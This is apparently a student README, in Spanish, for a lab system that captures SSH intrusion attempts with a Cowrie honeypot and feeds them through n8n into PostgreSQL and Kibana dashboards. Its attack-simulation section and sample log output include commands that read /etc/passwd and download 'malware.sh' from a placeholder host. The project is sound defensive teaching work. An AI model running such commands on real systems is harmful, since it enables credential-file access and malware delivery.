# 🛡️ Proyecto 08 — Implementación y Monitoreo Automatizado de Honeypots

**Grupo:** Oscorp  
**Integrantes:** López, Santiago — Morato, Elizabeth  
**Carrera:** Tecnicatura en Programación  
**Año:** 2026

---

## 📌 Descripción del Proyecto

Este proyecto implementa un sistema automatizado de monitoreo de honeypots capaz de capturar, procesar, almacenar y visualizar eventos de intrusión en tiempo real.

El sistema utiliza el honeypot **Cowrie** para simular un servidor SSH vulnerable, **n8n** para automatizar el procesamiento de logs, **PostgreSQL** para almacenamiento estructurado y **ELK Stack** (Elasticsearch + Kibana) para análisis y visualización de ataques.

### Arquitectura del sistema

```
Atacante
    ↓
Honeypot Cowrie (puerto 2222)
    ↓
Logs JSON (cowrie.json)
    ↓
n8n (automatización)
    ├── PostgreSQL (almacenamiento histórico)
    └── Elasticsearch (análisis en tiempo real)
                ↓
            Kibana
              ├── Distribución de Comandos
              ├── Top IPs de Origen
              ├── Actividad Temporal
              └── Indicadores de Compromiso (IoCs)
```

---

## 🧰 Tecnologías Utilizadas

| Herramienta | Versión | Función |
|-------------|---------|---------|
| Docker | 24+ | Contenedorización del entorno |
| Cowrie | 2.9+ | Honeypot SSH |
| PostgreSQL | 16 | Base de datos relacional |
| n8n | 1.x | Automatización de flujos |
| Elasticsearch | 8.13.0 | Motor de búsqueda y análisis |
| Kibana | 8.13.0 | Visualización de datos |
| Python | 3.11+ | Scripts de análisis |

---

## ✅ Requisitos Previos

Antes de comenzar, asegurate de tener instalado:

- **Docker Desktop** — https://www.docker.com/products/docker-desktop
- **Git** — https://git-scm.com/download/win
- **Python 3.11+** — https://www.python.org/downloads/
- **DBeaver Community** (opcional, para visualizar la base de datos) — https://dbeaver.io/download/

**Recursos mínimos recomendados:**
- RAM: 8 GB (se recomiendan 12 GB)
- Disco: 10 GB libres
- Sistema operativo: Windows 10/11, Linux o macOS

---

## 🚀 Instalación y Configuración

### Paso 1 — Clonar el repositorio

```bash
git clone https://github.com/ElizabethMorato/Proyecto-honeypots.git
cd Proyecto-honeypots
```

### Paso 2 — Levantar todos los servicios

Desde la carpeta `docker/` ejecutar:

```bash
cd docker
docker-compose up -d
```

Este comando descarga automáticamente todas las imágenes necesarias y levanta los siguientes contenedores:

| Contenedor | Imagen | Puerto |
|-----------|--------|--------|
| friendly_kalam | cowrie/cowrie | 2222 |
| db-honeypot | postgres:16 | 5433 |
| n8n | n8nio/n8n | 5678 |
| elasticsearch | elasticsearch:8.13.0 | 9200 |
| kibana | kibana:8.13.0 | 5601 |

### Paso 3 — Verificar que todos los contenedores estén activos

```bash
docker ps
```

Deberías ver los 5 contenedores con estado `Up`.

### Paso 4 — Crear la base de datos

Ejecutar el script SQL para crear la tabla de eventos:

```bash
docker exec -it db-honeypot psql -U admin -d honeypot -f /docker-entrypoint-initdb.d/schema.sql
```

O ejecutar manualmente el contenido del archivo `database/schema.sql`:

```bash
docker exec -it db-honeypot psql -U admin -d honeypot -c "
CREATE TABLE IF NOT EXISTS eventos (
  id SERIAL PRIMARY KEY,
  timestamp TIMESTAMP,
  src_ip VARCHAR(50),
  username VARCHAR(100),
  password VARCHAR(100),
  command TEXT,
  hash VARCHAR(255),
  client_version VARCHAR(255),
  session VARCHAR(100)
);"
```

### Paso 5 — Verificar que Elasticsearch funciona

Abrir en el navegador:

```
http://localhost:9200
```

Deberías ver una respuesta JSON con información del cluster.

### Paso 6 — Acceder a Kibana

Abrir en el navegador:

```
http://localhost:5601
```

---

## 🔧 Configuración de n8n

### Acceder a n8n

Abrir en el navegador:

```
http://localhost:5678
```

Crear una cuenta con cualquier email y contraseña.

### Importar el workflow

El workflow automatizado del proyecto se encuentra en la carpeta `scripts/`. Para importarlo:

1. En n8n ir a **Workflows**
2. Hacer clic en el menú `···`
3. Seleccionar **Import from file**
4. Seleccionar el archivo `scripts/workflow_honeypot.json`

### Configurar las credenciales

El workflow necesita dos credenciales:

**PostgreSQL:**
| Campo | Valor |
|-------|-------|
| Host | host.docker.internal |
| Port | 5433 |
| Database | honeypot |
| User | admin |
| Password | admin |

**Elasticsearch:**
| Campo | Valor |
|-------|-------|
| Base URL | http://host.docker.internal:9200 |

---

## 🐝 Uso del Honeypot

### Simular un ataque manualmente

```bash
ssh root@localhost -p 2222
```

Ingresar cualquier contraseña. Una vez dentro ejecutar comandos como:

```bash
ls
pwd
whoami
uname -a
cat /etc/passwd
wget http://example.com/malware.sh
```

### Ver los logs en tiempo real

```bash
docker logs -f friendly_kalam
```

### Copiar logs al proyecto

```bash
docker cp friendly_kalam:/cowrie/cowrie-git/var/log/cowrie/cowrie.json ./logs/cowrie.json
```

---

## ⚙️ Ejecutar el Pipeline Automatizado

Una vez configurado n8n:

1. Abrir el workflow en `http://localhost:5678`
2. Hacer clic en **Execute workflow**
3. Verificar que los 6 nodos muestren ✅

El pipeline realiza automáticamente:

```
Leer cowrie.json
       ↓
Parsear eventos JSON
       ↓
Filtrar eventos relevantes
       ↓
Insertar en PostgreSQL ──── Indexar en Elasticsearch
```

---

## 📊 Dashboards en Kibana

### Configurar Data View

1. Ir a `http://localhost:5601`
2. Ir a **Stack Management → Data Views**
3. Crear un Data View con estos parámetros:

| Campo | Valor |
|-------|-------|
| Name | eventos_honeypot |
| Index pattern | eventos_honeypot* |
| Timestamp field | timestamp |

### Dashboards disponibles

| Panel | Tipo | Descripción |
|-------|------|-------------|
| Distribución de Comandos | Dona | Comandos ejecutados por atacantes |
| Top IPs de Origen | Tabla | IPs que más atacaron |
| Actividad Temporal | Barras | Ataques por día/hora |
| Indicadores de Compromiso | Tabla | Hashes SHA-256 de malware |

---

## 🗄️ Estructura del Repositorio

```
Proyecto-honeypots/
├── docker/
│   └── docker-compose.yml       → Configuración de todos los contenedores
├── database/
│   └── schema.sql               → Script SQL para crear la tabla eventos
├── scripts/
│   ├── analizar_cowrie.py       → Script Python para analizar logs
│   └── workflow_honeypot.json   → Workflow exportado de n8n
├── logs/
│   └── cowrie.json              → Ejemplo de logs generados por Cowrie
├── docs/
│   └── informe.pdf              → Documento de tesis
└── README.md                    → Este archivo
```

---

## 🔄 Comandos de Gestión

### Levantar el sistema

```bash
docker start friendly_kalam db-honeypot n8n elasticsearch kibana
```

### Detener el sistema

```bash
docker stop friendly_kalam db-honeypot n8n elasticsearch kibana
```

### Ver estado de los contenedores

```bash
docker ps
```

### Ver uso de recursos

```bash
docker stats --no-stream
```

---

## 🗃️ Acceso a la Base de Datos

### Desde DBeaver

| Campo | Valor |
|-------|-------|
| Host | localhost |
| Port | 5433 |
| Database | honeypot |
| User | admin |
| Password | admin |

**Nota:** Si aparece error de zona horaria, agregar `-Duser.timezone=UTC` al archivo `dbeaver.ini`.

### Desde terminal

```bash
docker exec -it db-honeypot psql -U admin -d honeypot
```

Consultas útiles:

```sql
-- Ver todos los eventos
SELECT * FROM eventos ORDER BY timestamp DESC;

-- Ver solo logins exitosos
SELECT timestamp, src_ip, username, password 
FROM eventos 
WHERE username IS NOT NULL 
ORDER BY timestamp DESC;

-- Ver comandos ejecutados
SELECT timestamp, src_ip, command 
FROM eventos 
WHERE command IS NOT NULL 
ORDER BY timestamp DESC;

-- Contar eventos por IP
SELECT src_ip, COUNT(*) as total 
FROM eventos 
GROUP BY src_ip 
ORDER BY total DESC;
```

---

## 🐍 Script de Análisis Python

El archivo `scripts/analizar_cowrie.py` permite analizar los logs directamente:

```bash
cd scripts
python analizar_cowrie.py
```

Muestra en consola:

```
LOGIN EXITOSO
  IP:       172.17.0.1
  Usuario:  root
  Password: admin
  Sesion:   7409e7e55428
  Fecha:    2026-04-12T23:18:07Z
----------------------------------------
COMANDO EJECUTADO
  IP:       172.17.0.1
  Comando:  wget http://example.com/malware.sh
  Sesion:   7409e7e55428
----------------------------------------
```

---

## ⚠️ Consideraciones de Seguridad

- Este sistema está diseñado exclusivamente para uso en entornos controlados de laboratorio.
- El honeypot simula un servidor vulnerable. No exponer a internet sin supervisión.
- Las credenciales de la base de datos son de desarrollo. No usar en producción.
- Elasticsearch tiene la seguridad desactivada (`xpack.security.enabled=false`) para facilitar el laboratorio.

---

## 📚 Referencias

- Cowrie Honeypot: https://github.com/cowrie/cowrie
- n8n Documentation: https://docs.n8n.io
- Elasticsearch Guide: https://www.elastic.co/guide
- PostgreSQL Documentation: https://www.postgresql.org/docs

---

## 📄 Licencia

Proyecto académico — Tecnicatura en Programación — 2026  
Grupo Oscorp — López, Santiago & Morato, Elizabeth